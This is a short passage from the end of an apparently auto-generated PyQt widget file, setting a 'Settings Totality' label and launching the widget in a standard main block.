        self.settings_totality_label.setText(_translate("Widget", "Settings Totality"))


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    Widget = QtWidgets.QWidget()
    ui = Ui_Widget()
    ui.setupUi(Widget)
    Widget.show()
    sys.exit(app.exec_())
